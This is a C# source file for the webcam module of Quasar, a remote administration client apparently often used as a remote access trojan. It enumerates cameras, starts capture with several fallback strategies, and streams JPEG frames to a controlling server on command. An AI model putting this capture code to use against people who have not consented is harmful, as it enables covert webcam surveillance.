using AForge.Video;
using AForge.Video.DirectShow;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;

namespace Quasar.Client.Messages
{
    public class WebcamHandler : NotificationMessageProcessor, IDisposable
    {
        private VideoCaptureDevice _videoSource;
        private Bitmap _latestFrame;
        private readonly object _frameLock = new object();
        private readonly object _captureLock = new object();
        private bool _isStarted;
        private ISender _client;
        private FilterInfoCollection _videoDevices;

        /// <summary>
        /// Signaled when the first frame arrives from the camera.
        /// </summary>
        private readonly ManualResetEventSlim _firstFrameEvent = new ManualResetEventSlim(false);

        /// <summary>
        /// Small delay before retrying when a frame is not yet available.
        /// Prevents tight network polling loops when the camera is slow.
        /// </summary>
        private const int RetryDelayMs = 200;

        public override bool CanExecute(IMessage message) => message is GetWebcams ||
                                                              message is GetWebcamFrame ||
                                                              message is DoWebcamStop;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcams msg:
                    Execute(sender, msg);
                    break;
                case GetWebcamFrame msg:
                    Execute(sender, msg);
                    break;
                case DoWebcamStop msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetWebcams message)
        {
            try
            {
                _videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                string[] deviceNames = new string[_videoDevices.Count];
                for (int i = 0; i < _videoDevices.Count; i++)
                {
                    deviceNames[i] = _videoDevices[i].Name;
                }
                client.Send(new GetWebcamsResponse { WebcamNames = deviceNames });
            }
            catch (Exception)
            {
                client.Send(new GetWebcamsResponse { WebcamNames = new string[0] });
            }
        }

        private void Execute(ISender client, GetWebcamFrame message)
        {
            try
            {
                _client = client;

                if (message.CreateNew)
                {
                    lock (_captureLock)
                    {
                        StopCapture();
                        _firstFrameEvent.Reset();
                        _isStarted = true;
                    }
                    OnReport("Webcam session started");

                    // Try multiple capture strategies until one produces frames.
                    // Different cameras (especially laptop integrated ones) need
                    // different approaches to start producing frames.
                    bool gotFrame = TryCaptureStrategies(message.DeviceIndex);

                    if (!gotFrame)
                    {
                        // All strategies exhausted — camera genuinely can't produce frames.
                        // Keep _isStarted=true so the polling loop continues (camera might
                        // start working if the blocking app releases it).
                    }
                }

                if (!_isStarted)
                    return;

                byte[] imageData = GetCurrentFrame(message.Quality);

                // If frame is still null (camera warming up), wait briefly
                // so we don't spin in a tight server-client polling loop.
                if (imageData == null)
                {
                    Thread.Sleep(RetryDelayMs);
                }

                client.Send(new GetWebcamFrameResponse
                {
                    Image = imageData,
                    DeviceIndex = message.DeviceIndex,
                    Quality = message.Quality
                });
            }
            catch (Exception)
            {
                client.Send(new GetWebcamFrameResponse
                {
                    Image = null,
                    DeviceIndex = message.DeviceIndex,
                    Quality = message.Quality
                });
            }
        }

        /// <summary>
        /// Tries multiple capture strategies in sequence until one produces frames.
        /// Returns true if a frame was obtained, false if all strategies failed.
        /// </summary>
        private bool TryCaptureStrategies(int deviceIndex)
        {
            if (_videoDevices == null)
                _videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (deviceIndex >= _videoDevices.Count)
                return false;

            string monikerString = _videoDevices[deviceIndex].MonikerString;

            // ── Strategy 1: Default resolution (no explicit setting) ──
            // Works on most desktop USB cameras.
            // Wait up to 8 seconds — some laptop cameras (HP, Dell, Lenovo)
            // can take 5-8 seconds to initialize their DirectShow pipeline.
            if (TryStartWithCapability(monikerString, null, 8000))
                return true;

            // ── Strategy 2: Explicitly set resolution closest to 640x480 ──
            // Some cameras (especially integrated laptop cams) require an
            // explicit resolution to be set from their VideoCapabilities.
            try
            {
                var tempDevice = new VideoCaptureDevice(monikerString);
                var capabilities = tempDevice.VideoCapabilities;
                tempDevice = null; // Don't start, just read caps

                if (capabilities != null && capabilities.Length > 0)
                {
                    // Sort capabilities by distance to 640x480
                    Array.Sort(capabilities, (a, b) =>
                    {
                        int distA = Math.Abs(a.FrameSize.Width - 640) + Math.Abs(a.FrameSize.Height - 480);
                        int distB = Math.Abs(b.FrameSize.Width - 640) + Math.Abs(b.FrameSize.Height - 480);
                        return distA.CompareTo(distB);
                    });

                    // Try each resolution — give each one 5 seconds since
                    // some cameras need time to negotiate the format with the driver.
                    // Limit to 3 attempts to keep total wait time reasonable.
                    int attempts = 0;
                    foreach (var cap in capabilities)
                    {
                        if (attempts >= 3) break;
                        attempts++;

                        StopCaptureInternal();
                        _firstFrameEvent.Reset();

                        if (TryStartWithCapability(monikerString, cap, 5000))
                            return true;
                    }
                }
            }
            catch
            {
                // Can't read capabilities — skip this strategy
            }

            // ── Strategy 3: Snapshot mode ──
            // Some cameras (HP, Lenovo) support snapshot mode when regular
            // NewFrame events don't fire. Use ProvideSnapshots + SnapshotFrame.
            StopCaptureInternal();
            _firstFrameEvent.Reset();
            if (TryStartWithSnapshot(monikerString, 5000))
                return true;

            return false;
        }

        /// <summary>
        /// Tries to start capture with a specific video capability and waits for a frame.
        /// </summary>
        /// <param name="monikerString">The device moniker string.</param>
        /// <param name="capability">The video capability to set, or null for default.</param>
        /// <param name="waitMs">Maximum time to wait for the first frame.</param>
        /// <returns>True if a frame was received within the wait time.</returns>
        private bool TryStartWithCapability(string monikerString, VideoCapabilities capability, int waitMs)
        {
            try
            {
                StopCaptureInternal();

                _videoSource = new VideoCaptureDevice(monikerString);

                if (capability != null)
                {
                    _videoSource.VideoResolution = capability;
                }

                _videoSource.NewFrame += VideoSource_NewFrame;
                _videoSource.Start();

                // Wait for the first frame
                return _firstFrameEvent.Wait(waitMs);
            }
            catch
            {
                StopCaptureInternal();
                return false;
            }
        }

        /// <summary>
        /// Tries to start capture using snapshot mode as a fallback.
        /// Some cameras only respond to snapshot requests, not continuous streaming.
        /// </summary>
        private bool TryStartWithSnapshot(string monikerString, int waitMs)
        {
            try
            {
                StopCaptureInternal();

                _videoSource = new VideoCaptureDevice(monikerString);

                // Enable snapshot mode
                _videoSource.ProvideSnapshots = true;
                _videoSource.SnapshotFrame += VideoSource_SnapshotFrame;
                _videoSource.NewFrame += VideoSource_NewFrame;

                // Set snapshot resolution if available
                try
                {
                    var snapCaps = _videoSource.SnapshotCapabilities;
                    if (snapCaps != null && snapCaps.Length > 0)
                    {
                        VideoCapabilities best = snapCaps[0];
                        foreach (var cap in snapCaps)
                        {
                            int bestDist = Math.Abs(best.FrameSize.Width - 640) + Math.Abs(best.FrameSize.Height - 480);
                            int capDist = Math.Abs(cap.FrameSize.Width - 640) + Math.Abs(cap.FrameSize.Height - 480);
                            if (capDist < bestDist)
                                best = cap;
                        }
                        _videoSource.SnapshotResolution = best;
                    }
                }
                catch { }

                _videoSource.Start();

                // Trigger a snapshot request
                Thread.Sleep(500); // Give the device a moment to start
                try { _videoSource.SimulateTrigger(); } catch { }

                return _firstFrameEvent.Wait(waitMs);
            }
            catch
            {
                StopCaptureInternal();
                return false;
            }
        }

        private void Execute(ISender client, DoWebcamStop message)
        {
            lock (_captureLock)
            {
                _isStarted = false;
                StopCapture();
            }
            _client = null;
            OnReport("Webcam session stopped");
        }

        /// <summary>
        /// Stops the video capture and releases resources (lock-free version for internal use).
        /// </summary>
        private void StopCaptureInternal()
        {
            if (_videoSource != null)
            {
                try
                {
                    _videoSource.NewFrame -= VideoSource_NewFrame;
                    try { _videoSource.SnapshotFrame -= VideoSource_SnapshotFrame; } catch { }

                    if (_videoSource.IsRunning)
                    {
                        _videoSource.SignalToStop();
                        var waitThread = new Thread(() =>
                        {
                            try { _videoSource.WaitForStop(); } catch { }
                        });
                        waitThread.IsBackground = true;
                        waitThread.Start();
                        if (!waitThread.Join(3000))
                        {
                            try { _videoSource.Stop(); } catch { }
                        }
                    }
                }
                catch { }
                _videoSource = null;
            }

            lock (_frameLock)
            {
                _latestFrame?.Dispose();
                _latestFrame = null;
            }
        }

        /// <summary>
        /// Stops the video capture and releases resources (thread-safe, called externally).
        /// </summary>
        private void StopCapture()
        {
            StopCaptureInternal();
        }

        /// <summary>
        /// Called by DirectShow for each new video frame.
        /// </summary>
        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            lock (_frameLock)
            {
                _latestFrame?.Dispose();
                _latestFrame = (Bitmap)eventArgs.Frame.Clone();
            }

            // Signal that we have received at least one frame.
            if (!_firstFrameEvent.IsSet)
                _firstFrameEvent.Set();
        }

        /// <summary>
        /// Called by DirectShow for snapshot frames (fallback capture mode).
        /// </summary>
        private void VideoSource_SnapshotFrame(object sender, NewFrameEventArgs eventArgs)
        {
            // Treat snapshot frames the same as regular frames
            VideoSource_NewFrame(sender, eventArgs);

            // Request another snapshot to keep the "stream" going
            try
            {
                if (_isStarted && _videoSource != null)
                {
                    Thread.Sleep(33); // ~30 fps equivalent delay
                    _videoSource.SimulateTrigger();
                }
            }
            catch { }
        }

        /// <summary>
        /// Gets the latest captured frame as JPEG-encoded bytes.
        /// Converts the frame to a JPEG-compatible pixel format if needed.
        /// </summary>
        private byte[] GetCurrentFrame(int quality)
        {
            Bitmap frame;
            lock (_frameLock)
            {
                if (_latestFrame == null)
                    return null;
                frame = (Bitmap)_latestFrame.Clone();
            }

            try
            {
                // Some cameras (especially laptop integrated cameras) produce frames
                // in pixel formats that the JPEG encoder cannot handle directly
                // (e.g., Format16bppGrayScale, Format32bppPArgb, Format48bppRgb).
                // Convert to 32bppArgb which is universally supported by GDI+.
                if (frame.PixelFormat != PixelFormat.Format24bppRgb &&
                    frame.PixelFormat != PixelFormat.Format32bppRgb &&
                    frame.PixelFormat != PixelFormat.Format32bppArgb)
                {
                    var converted = new Bitmap(frame.Width, frame.Height, PixelFormat.Format32bppArgb);
                    try
                    {
                        using (var g = Graphics.FromImage(converted))
                        {
                            g.DrawImage(frame, 0, 0, frame.Width, frame.Height);
                        }
                        frame.Dispose();
                        frame = converted;
                    }
                    catch
                    {
                        converted.Dispose();
                        // If conversion fails, try encoding the original frame anyway.
                    }
                }

                using (frame)
                using (var ms = new MemoryStream())
                {
                    var encoderParams = new EncoderParameters(1);
                    encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)quality);
                    var jpegCodec = GetJpegCodec();
                    if (jpegCodec != null)
                        frame.Save(ms, jpegCodec, encoderParams);
                    else
                        frame.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
            catch (Exception)
            {
                frame?.Dispose();
                return null;
            }
        }

        private ImageCodecInfo GetJpegCodec()
        {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.FormatID == ImageFormat.Jpeg.Guid)
                    return codec;
            }
            return null;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_captureLock)
                {
                    _isStarted = false;
                    StopCapture();
                }
                _firstFrameEvent.Dispose();
            }
        }
    }
}
